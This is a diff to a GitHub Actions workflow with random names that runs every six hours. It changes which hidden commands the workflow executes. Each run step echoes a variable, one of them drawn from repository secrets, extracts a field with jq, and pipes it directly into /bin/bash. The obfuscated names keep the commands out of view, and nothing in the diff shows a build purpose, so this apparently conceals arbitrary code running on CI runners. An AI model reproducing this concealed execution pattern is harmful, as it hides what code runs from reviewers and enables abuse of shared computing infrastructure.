@@ -2,30 +2,19 @@ name: longshuangfang4513
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 4/6 * * *'
+    - cron: '42 4/6 * * *'
 
-jobs:  # 551
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: longshuangfang4513
         env:
-          ta2: ${{ secrets.ta2 }}
+          kkyif121: ${{ secrets.kkyif121 }}
         run: |
-          echo $ta2 | jq -r .khhsp807 | /bin/bash
-          echo $s83 | jq -r .k6 | /bin/bash
-          echo $ig75 | jq -r .pqpn2 | /bin/bash
-          echo $aj34 | jq -r .kcwvu428 | /bin/bash
-          echo $pk490 | jq -r .qv97 | /bin/bash
-          echo $qjxd33 | jq -r .cjewy8 | /bin/bash
-          echo $f627 | jq -r .hpyd42685 | /bin/bash
-          echo $rkxoy83866 | jq -r .y25580 | /bin/bash
-          echo $fxyb07 | jq -r .dx20542 | /bin/bash
-          echo $z45 | jq -r .qfx6927 | /bin/bash
-          echo $nrtmm2 | jq -r .i8 | /bin/bash
-          echo $whiap246 | jq -r .f48401 | /bin/bash
-          echo $awb50 | jq -r .bmwb2 | /bin/bash
-          echo $coq2468 | jq -r .biun84969 | /bin/bash
-          echo $dzh2177 | jq -r .nins35 | /bin/bash
+          echo $kkyif121 | jq -r .s61036 | /bin/bash
+          echo $ykmdw63933 | jq -r .wiog916 | /bin/bash
+          echo $x1 | jq -r .uhs41136 | /bin/bash
 
